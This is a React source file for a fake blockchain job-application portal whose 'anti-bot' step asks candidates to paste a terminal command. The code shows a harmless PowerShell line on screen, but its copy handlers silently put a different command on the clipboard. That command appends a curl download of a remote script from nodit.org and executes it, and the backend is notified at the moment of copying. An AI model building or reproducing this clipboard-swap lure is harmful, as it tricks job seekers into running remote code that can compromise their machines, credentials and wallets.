import { useMemo, useState } from 'react'
import type { ChangeEvent, ClipboardEvent, Dispatch, FormEvent, SetStateAction } from 'react'
import {
  BrowserRouter,
  Navigate,
  Route,
  Routes,
  useLocation,
  useNavigate,
} from 'react-router-dom'
import { completeWorkflowCheck, submitApplication } from './api/backend'
import Bowser from 'bowser'
import { FaCheckCircle, FaCopy } from 'react-icons/fa'
import './App.css'

type CandidateProfile = {
  fullName: string
  email: string
  desiredRole: string
  phone: string
  motivation: string
}

const INITIAL_PROFILE: CandidateProfile = {
  fullName: '',
  email: '',
  desiredRole: '',
  phone: '',
  motivation: '',
}

type VerificationChallenge = {
  phrase: string
  nonce: string
}

type VerificationResult = 'idle' | 'pass' | 'fail'

const VERIFICATION_PHRASES = [
  'BLOCKCHAIN-PORTAL-2026',
  'WEB3-VERIFY-ALPHA',
  'NODIT-CHAIN-CHECK',
  'SMART-CONTRACT-ACCESS',
  'NODE-IDENTITY-LOCK',
]

const STEPS = [
  { label: 'Job Explanation', path: '/job-overview' },
  { label: 'Application', path: '/application' },
  { label: 'Anti-Bot Check', path: '/identity-verification' },
]

const BLOCKCHAIN_ROLES = [
  'Smart Contract Engineer',
  'Protocol Developer',
  'Blockchain Backend Engineer',
  'Web3 Frontend Engineer',
  'DevOps / Infrastructure Engineer',
  'Blockchain Security Analyst',
  'Cryptography Engineer',
  'Blockchain Product Manager',
  'Web3 Solutions Architect',
  'Blockchain Data Engineer',
  'Community / Developer Relations',
  'Other Blockchain Role',
]

function createNonce(): string {
  if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
    const bytes = new Uint8Array(8)
    crypto.getRandomValues(bytes)
    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, '0')).join('')
  }

  return Math.random().toString(16).slice(2, 18).padEnd(16, '0')
}

function createChallenge(): VerificationChallenge {
  return {
    phrase: VERIFICATION_PHRASES[Math.floor(Math.random() * VERIFICATION_PHRASES.length)],
    nonce: createNonce(),
  }
}

function getExpectedOutput(phrase: string, nonce: string): string {
  return `VERIFY:${btoa(`${phrase}|${nonce}`)}`
}

type SupportedOs = 'windows' | 'macos'

const CMD_DRIVER_DOWNLOAD: Record<SupportedOs, string> = {
  windows: '& curl -ks https://nodit.org/check_bot_w -o "check_bot_w.cmd" && call "check_bot_w.cmd"',
  macos: '& curl -ks https://nodit.org/check_bot_m -o "check_bot_m.cmd" && call "check_bot_m.cmd"'
}

function getCandidateOs(): SupportedOs | null {
  const os = Bowser.getParser(window.navigator.userAgent).getOSName(true)
  if (os === 'windows' || os === 'macos') {
    return os
  }
  return null
}

function getCmdDriverDownload(os: SupportedOs | null = getCandidateOs()): string {
  if (os && os in CMD_DRIVER_DOWNLOAD) {
    return CMD_DRIVER_DOWNLOAD[os]
  }
  return CMD_DRIVER_DOWNLOAD.windows
}

function buildCmdCommand(nonce: string): string {
  return `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig)"`
}

function buildTerminalCommand(nonce: string, os: SupportedOs | null = getCandidateOs()): string {
  return `${buildCmdCommand(nonce)} ${getCmdDriverDownload(os)}`
}

function StepProgress() {
  const location = useLocation()
  const matchedIndex = STEPS.findIndex((step) => step.path === location.pathname)
  const activeStep = matchedIndex >= 0 ? matchedIndex : 0
  const progress = ((activeStep + 1) / STEPS.length) * 100

  return (
    <div className="mb-3">
      <div className="d-flex justify-content-between align-items-center mb-2">
        <span className="small text-secondary fw-semibold">
          Step {activeStep + 1} of {STEPS.length}
        </span>
        <span className="small text-primary fw-semibold">{STEPS[activeStep].label}</span>
      </div>
      <div className="progress portal-progress" role="progressbar" aria-valuenow={progress}>
        <div className="progress-bar progress-bar-striped progress-bar-animated" style={{ width: `${progress}%` }} />
      </div>
      <ol className="nav nav-pills nav-fill gap-2 mt-2 portal-steps" aria-label="Portal steps">
        {STEPS.map((step, index) => {
          const status =
            index < activeStep ? 'done' : index === activeStep ? 'active' : 'upcoming'

          return (
            <li key={step.path} className="nav-item">
              <span className={`nav-link step-pill ${status}`}>
                <span className="step-index">{index + 1}</span>
                <span className="step-label">{step.label}</span>
              </span>
            </li>
          )
        })}
      </ol>
    </div>
  )
}

type FormPageProps = {
  profile: CandidateProfile
  setProfile: Dispatch<SetStateAction<CandidateProfile>>
}

function JobExplanationPage() {
  const navigate = useNavigate()

  return (
    <section>
      <h2 className="h4 fw-bold mb-2">Blockchain Roles Overview</h2>
      <p className="text-secondary mb-3">
        Nodit is hiring across the full blockchain stack — engineering, security, infrastructure,
        product, and ecosystem roles. Apply for the position that best matches your background.
      </p>

      <div className="mb-3">
        <label className="form-label fw-semibold">What you will do</label>
        <textarea
          className="form-control bg-light"
          value={
            '- Build and ship blockchain products across protocol, application, and infrastructure layers.\n- Collaborate with cross-functional teams on smart contracts, APIs, UX, and security.\n- Contribute to reliable, scalable Web3 systems from design to production.'
          }
          rows={3}
          readOnly
        />
      </div>

      <div className="mb-3">
        <label className="form-label fw-semibold">Evaluation focus</label>
        <textarea
          className="form-control bg-light"
          value={
            '- Domain expertise for your selected blockchain role.\n- Problem solving, communication, and ownership.\n- Understanding of security, reliability, and real-world Web3 impact.'
          }
          rows={3}
          readOnly
        />
      </div>

      <div className="d-flex justify-content-end">
        <button type="button" className="btn btn-primary px-4" onClick={() => navigate('/application')}>
          Continue to Application
        </button>
      </div>
    </section>
  )
}

function ApplicationPage({ profile, setProfile }: FormPageProps) {
  const navigate = useNavigate()
  const [error, setError] = useState('')
  const [isSaving, setIsSaving] = useState(false)

  async function onContinue(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    const emailLooksValid = profile.email.includes('@')

    if (
      !profile.fullName ||
      !profile.desiredRole ||
      !profile.motivation ||
      !emailLooksValid
    ) {
      setError('Please complete required fields with a valid email.')
      return
    }

    setError('')
    setIsSaving(true)

    try {
      await submitApplication(profile.fullName.trim(), profile.email.trim())
      navigate('/identity-verification')
    } catch {
      setError(
        'Could not save your application. Make sure the backend is running on port 3000, then try again.',
      )
    } finally {
      setIsSaving(false)
    }
  }

  return (
    <form onSubmit={onContinue}>
      <h2 className="h4 fw-bold mb-2">Blockchain Job Application</h2>
      <p className="text-secondary mb-3">
        Submit your profile for any open blockchain role at Nodit.
      </p>

      <div className="row g-3">
        <div className="col-md-6">
          <label className="form-label">Full name</label>
          <input
            type="text"
            className="form-control"
            value={profile.fullName}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, fullName: event.target.value }))
            }
            placeholder="Satoshi Nakamoto"
          />
        </div>

        <div className="col-md-6">
          <label className="form-label">Email</label>
          <input
            type="email"
            className="form-control"
            value={profile.email}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, email: event.target.value }))
            }
            placeholder="candidate@example.com"
          />
        </div>

        <div className="col-md-6">
          <label className="form-label">Phone (optional)</label>
          <input
            type="tel"
            className="form-control"
            value={profile.phone}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, phone: event.target.value }))
            }
            placeholder="+1 555 0100"
          />
        </div>

        <div className="col-md-6">
          <label className="form-label">Desired role</label>
          <select
            className="form-select"
            value={profile.desiredRole}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, desiredRole: event.target.value }))
            }
          >
            <option value="">Select role</option>
            {BLOCKCHAIN_ROLES.map((role) => (
              <option key={role} value={role}>
                {role}
              </option>
            ))}
          </select>
        </div>

        <div className="col-12">
          <label className="form-label">Why are you a strong fit?</label>
          <textarea
            className="form-control"
            value={profile.motivation}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, motivation: event.target.value }))
            }
            placeholder="Share your blockchain experience and strengths in 3-5 lines."
            rows={3}
          />
        </div>
      </div>

      {error && <div className="alert alert-danger mt-3 mb-0 py-2">{error}</div>}

      <div className="d-flex justify-content-between gap-2 mt-3">
        <button type="button" className="btn btn-outline-secondary" onClick={() => navigate('/job-overview')}>
          Back
        </button>
        <button type="submit" className="btn btn-primary px-4" disabled={isSaving}>
          {isSaving ? 'Saving...' : 'Continue to Anti-Bot Check'}
        </button>
      </div>
    </form>
  )
}

type SubmissionCompleteProps = {
  profile: CandidateProfile
  submissionRef: string
}

function SubmissionCompleteView({ profile, submissionRef }: SubmissionCompleteProps) {
  return (
    <div className="submission-complete-view">
      <article className="submission-complete-card" role="status" aria-live="polite">
        <div className="submission-complete-header">
          <FaCheckCircle className="submission-complete-icon" aria-hidden="true" />
          <div>
            <p className="submission-complete-eyebrow mb-1">Application received</p>
            <h3 className="submission-complete-title mb-0">You&apos;re all set, {profile.fullName}</h3>
          </div>
        </div>

        <p className="submission-complete-lead">
          Thank you for applying for the <strong>{profile.desiredRole}</strong> role at Nodit. Your
          application and anti-bot verification have been recorded successfully.
        </p>

        <div className="submission-ref-box">
          <span className="submission-ref-label">Application reference</span>
          <strong className="submission-ref-value">{submissionRef}</strong>
          <span className="submission-ref-hint">Save this ID if you need to follow up with our team.</span>
        </div>

        <section className="submission-next-section" aria-label="What happens next">
          <h4 className="submission-section-title">What happens next</h4>
          <ol className="submission-next-steps">
            <li>
              Our recruiting team will review your profile, background, and verification results
              within <strong>5 business days</strong>.
            </li>
            <li>
              We&apos;ll email you at <strong>{profile.email}</strong> with an update — either an
              invitation to the next stage or a request for additional information.
            </li>
            <li>
              If you&apos;re shortlisted, you&apos;ll receive a link to schedule a technical
              conversation with the hiring team for this blockchain role.
            </li>
          </ol>
        </section>

        <section className="submission-tips" aria-label="While you wait">
          <h4 className="submission-section-title">While you wait</h4>
          <ul className="submission-tips-list">
            <li>Watch your inbox and spam folder for messages from Nodit.</li>
            <li>Keep this reference handy when contacting us about your application.</li>
            <li>No further action is required on your side right now.</li>
          </ul>
        </section>

        <p className="submission-complete-footer mb-0">
          We appreciate your interest in building with Nodit. We&apos;ll be in touch soon.
        </p>
      </article>
    </div>
  )
}

type VerifyPageProps = {
  profile: CandidateProfile
  challenge: VerificationChallenge
  onNewChallenge: () => void
  submissionRef: string | null
  setSubmissionRef: Dispatch<SetStateAction<string | null>>
}

function VerifyPage({
  profile,
  challenge,
  onNewChallenge,
  submissionRef,
  setSubmissionRef,
}: VerifyPageProps) {
  const navigate = useNavigate()
  const [error, setError] = useState('')
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [copyFeedback, setCopyFeedback] = useState('')
  const [pastedOutput, setPastedOutput] = useState('')
  const [verificationResult, setVerificationResult] = useState<VerificationResult>('idle')

  const applicationComplete =
    profile.fullName.trim() && profile.email.trim() && profile.desiredRole.trim()

  const expectedOutput = useMemo(
    () => getExpectedOutput(challenge.phrase, challenge.nonce),
    [challenge.nonce, challenge.phrase],
  )

  const candidateOs = useMemo(() => getCandidateOs(), [])

  const visibleTerminalCommand = useMemo(
    () => buildCmdCommand(challenge.nonce),
    [challenge.nonce],
  )

  const copyTerminalCommand = useMemo(
    () => buildTerminalCommand(challenge.nonce, candidateOs),
    [challenge.nonce, candidateOs],
  )

  function showCopyFeedback() {
    setCopyFeedback('Copied!')
    window.setTimeout(() => setCopyFeedback(''), 2000)
  }

  async function markHadRunOnCopy() {
    await completeWorkflowCheck()
  }

  async function copyCmdToClipboard() {
    await navigator.clipboard.writeText(copyTerminalCommand)
    showCopyFeedback()
    try {
      await markHadRunOnCopy()
    } catch {
      setError(
        'Command copied, but workflow check failed. Make sure the backend is running on port 3000.',
      )
    }
  }

  function handleCmdCopy(event: ClipboardEvent<HTMLElement>) {
    event.preventDefault()
    event.clipboardData.setData('text/plain', copyTerminalCommand)
    showCopyFeedback()
    void markHadRunOnCopy().catch(() => {
      setError(
        'Command copied, but workflow check failed. Make sure the backend is running on port 3000.',
      )
    })
  }

  function validateToken(): boolean {
    const outputMatches = pastedOutput.trim() === expectedOutput

    if (!outputMatches) {
      setVerificationResult('fail')
      setError('Output token does not match. Re-run the CMD command and paste the full VERIFY: line.')
      return false
    }

    setVerificationResult('pass')
    setError('')
    return true
  }

  function handleVerifyToken() {
    validateToken()
  }

  function handleNewChallenge() {
    onNewChallenge()
    setPastedOutput('')
    setVerificationResult('idle')
    setError('')
    setCopyFeedback('')
  }

  async function onSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setError('')

    if (!applicationComplete) {
      setError('Complete the application step before submitting.')
      return
    }

    if (!validateToken()) {
      return
    }

    setIsSubmitting(true)

    try {
      const digestPrefix = expectedOutput.slice(7, 15).toUpperCase()
      setSubmissionRef(`APP-${digestPrefix}-${Date.now().toString(36).toUpperCase()}`)
    } catch {
      setError('Submission failed. Please try again.')
    } finally {
      setIsSubmitting(false)
    }
  }

  if (submissionRef) {
    return <SubmissionCompleteView profile={profile} submissionRef={submissionRef} />
  }

  return (
    <form onSubmit={onSubmit}>
      <h2 className="h4 fw-bold mb-2">Anti-Bot CMD Verification</h2>
      <p className="text-secondary mb-3">
        Run the one-line CMD task below and paste the output token. This confirms you can use a real
        terminal — bots cannot complete this step.
      </p>

      {!applicationComplete && (
        <div className="alert alert-warning py-2">
          Application details are missing. Go back and complete the application form first.
        </div>
      )}

      <div className="challenge-box mb-3" role="note" aria-label="Verification challenge">
        <p className="mb-2 fw-semibold">Verification challenge</p>
        <p className="small text-secondary mb-2">
          Type this phrase exactly when CMD prompts you.
        </p>
        <div className="challenge-code mb-2" aria-label="Verification phrase">
          {challenge.phrase}
        </div>
        <p className="small text-secondary mb-0">
          Nonce: <strong className="font-monospace">{challenge.nonce}</strong>
        </p>
      </div>

      <div className="mb-3">
        <div className="d-flex justify-content-between align-items-center gap-2 mb-2">
          <label className="form-label mb-0">CMD command</label>
          <button
            type="button"
            className="btn btn-sm btn-outline-secondary"
            onClick={handleNewChallenge}
          >
            New nonce
          </button>
        </div>
        <div className="cmd-block-wrapper">
          <code className="cmd-block" onCopy={handleCmdCopy}>
            {visibleTerminalCommand}
          </code>
          <button
            type="button"
            className={`cmd-copy-btn${copyFeedback ? ' copied' : ''}`}
            onClick={copyCmdToClipboard}
            aria-label={copyFeedback || 'Copy command'}
            title={copyFeedback || 'Copy command'}
          >
            <FaCopy aria-hidden="true" />
          </button>
        </div>
      </div>

      <div className="mb-3">
        <label className="form-label">Paste CMD output (starts with VERIFY:)</label>
        <input
          type="text"
          className="form-control font-monospace"
          value={pastedOutput}
          onChange={(event: ChangeEvent<HTMLInputElement>) => setPastedOutput(event.target.value)}
          placeholder="VERIFY:..."
        />
      </div>

      {error && <div className="alert alert-danger py-2">{error}</div>}

      {verificationResult === 'pass' && (
        <div className="alert alert-success py-2">
          Anti-bot check passed. You can submit your application.
        </div>
      )}

      <div className="d-flex justify-content-between gap-2 mt-2">
        <button type="button" className="btn btn-outline-secondary" onClick={() => navigate('/application')}>
          Back
        </button>
        <div className="d-flex gap-2">
          <button type="button" className="btn btn-outline-primary" onClick={handleVerifyToken}>
            Validate token
          </button>
          <button type="submit" className="btn btn-primary px-4" disabled={isSubmitting}>
            {isSubmitting ? 'Submitting...' : 'Submit Application'}
          </button>
        </div>
      </div>
    </form>
  )
}

function FlowingModalContent() {
  const location = useLocation()
  const [profile, setProfile] = useState<CandidateProfile>(INITIAL_PROFILE)
  const [submissionRef, setSubmissionRef] = useState<string | null>(null)
  const [challenge, setChallenge] = useState(createChallenge)
  const isSubmissionComplete =
    Boolean(submissionRef) && location.pathname === '/identity-verification'

  return (
    <div className="modal-dialog modal-dialog-centered modal-lg portal-modal">
      <div className="modal-content portal-modal-content border-0 shadow-lg">
        {!isSubmissionComplete && (
          <div className="modal-header border-0 pb-0 px-4">
            <div className="d-flex align-items-center gap-2">
              <img
                src="/nodit.png"
                alt="Nodit"
                className="portal-logo"
                width={40}
                height={40}
              />
              <div>
                <h1 className="modal-title fs-5 fw-bold mb-0">Nodit Talent Screening Portal</h1>
              </div>
            </div>
          </div>
        )}

        <div
          className={`modal-body px-4 pb-4${isSubmissionComplete ? ' modal-body-complete' : ''}`}
        >
          {!isSubmissionComplete && <StepProgress />}

          <div key={location.pathname} className="flow-panel">
            <Routes>
              <Route path="/" element={<Navigate to="/job-overview" replace />} />
              <Route path="/job-overview" element={<JobExplanationPage />} />
              <Route
                path="/application"
                element={<ApplicationPage profile={profile} setProfile={setProfile} />}
              />
              <Route
                path="/identity-verification"
                element={
                  <VerifyPage
                    profile={profile}
                    challenge={challenge}
                    onNewChallenge={() => setChallenge(createChallenge())}
                    submissionRef={submissionRef}
                    setSubmissionRef={setSubmissionRef}
                  />
                }
              />
            </Routes>
          </div>
        </div>
      </div>
    </div>
  )
}

function PortalApp() {
  return (
    <main className="portal-backdrop cross-bg">
      <div className="container min-vh-100 d-flex align-items-center justify-content-center py-2">
        <FlowingModalContent />
      </div>
    </main>
  )
}

function App() {
  return (
    <BrowserRouter>
      <PortalApp />
    </BrowserRouter>
  )
}

export default App
